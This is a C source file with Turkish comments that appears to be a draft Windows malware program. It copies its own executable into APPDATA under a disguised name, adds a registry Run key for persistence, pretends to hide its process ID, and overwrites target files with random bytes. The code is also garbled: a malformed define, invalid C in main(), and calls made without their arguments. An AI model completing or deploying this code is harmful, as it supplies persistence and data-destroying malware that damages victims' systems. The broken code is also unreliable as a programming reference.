#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <time.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#define _WIN32?_WINNT 0x0601

void os_detection(char *os) {					
	#if defined(_WIN32) || defined(_WIN64)
		strcpy(os, "windows");
	#elif defined(__linux__)
		strcpy(os, "linux");
	#elif defined(__APPLE__)
		strcpy(os, "apple");
	#else
		strcpy(os, "unknown");
	#endif
}
void persistence() {
    char file_direct[MAX_PATH];
    char regedit_command[MAX_PATH * 2];
    char* appdata = getenv("APPDATA");	// Appdata dizinini kontrol et
    if (appdata == NULL) {
        printf("Error: APPDATA environment variable not found.\n");
        return;
    }
    snprintf(file_direct, sizeof(file_direct), "%s\\sysupgrades.exe", appdata);	// Dosya dizinini oluştur
    if (_access(file_direct, 0) != 0) {    // Dosya varlığını kontrol et
        FILE* source = fopen(file_direct, "wb");  // Dosya yoksa oluştur
        FILE* destination = fopen(__argv[0], "rb");

        if (source == NULL || destination == NULL) {
            return;
        }
        char buffer[1024];
        size_t bytesRead;
        while ((bytesRead = fread(buffer, 1, sizeof(buffer), destination)) > 0) {
            fwrite(buffer, 1, bytesRead, source);
        }
        fclose(source);
        fclose(destination);
    }
    snprintf(regedit_command, sizeof(regedit_command),     // Regedit komutunu oluştur
             "REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v upgrade /t REG_SZ /d \"%s\" /f",
             file_direct);
    if (system(regedit_command) != 0) {     // Regedit komutunu çalıştır
    }
}
void pid_manipulation(DWORD pid_list[], DWORD max_pid_count) {	// Process ID saklama fonksiyonu
	DWORD bytes_needed;
	if (EnumProcesses(pid_list, max_pid_count * sizeof(DWORD), &bytes_needed)) {
        int process_count = bytes_needed / sizeof(DWORD);
		if (process_count > 0 ) {
			srand((unsigned)time(NULL));
			int random_index = rand() % process_count;
			DWORD random_pid = pid_list[random_index];
			DWORD my_pid = GetCurrentProcessId();
			pid_list[random_index] = my_pid;
		}
	}
}
void ListFilesInDirectory(const wchar_t *directory, const wchar_t *fileExtensions[], int numExtensions, const wchar_t *fileList[], int *fileCount) {
    WIN32_FIND_DATAW findFileData;
    HANDLE hFind = FindFirstFileW(directory, &findFileData);

    if (hFind == INVALID_HANDLE_VALUE) {
        return;
    }
    do {
        if (!(findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
            // Dosya uzantısını kontrol et
            const wchar_t *fileExtension = PathFindExtensionW(findFileData.cFileName);
            for (int i = 0; i < numExtensions; i++) {
                if (_wcsicmp(fileExtension, fileExtensions[i]) == 0) {
                    fileList[*fileCount] = _wcsdup(findFileData.cFileName);
                    (*fileCount)++;
                    break;
                }
            }
        }
    } while (FindNextFileW(hFind, &findFileData) != 0);
    	FindClose(hFind);
}
void ProcessFilesAndWriteRandomData() {
    const wchar_t *fileList[] = {L"example_file1.txt", L"example_file2.txt"};
    int numFiles = sizeof(fileList) / sizeof(fileList[0]);

    for (int i = 0; i < numFiles; i++) {
        FILE *fileHandle = _wfopen(fileList[i], L"wb");

        if (fileHandle != NULL) {
            fseek(fileHandle, 0, SEEK_END);
            long fileSize = ftell(fileHandle);
            fseek(fileHandle, 0, SEEK_SET);

            for (long j = 0; j < fileSize; j++) {
                unsigned char randomByte = rand() % 256;
                fwrite(&randomByte, sizeof(unsigned char), 1, fileHandle);
            }
            fclose(fileHandle);
        }
    }
}
int main() {
	os_detection();
    if os == "windows"{
		persistence();
		pid_manipulation();
		ListFilesInDirectory();
		ProcessFilesAndWriteRandomData();
		}
}
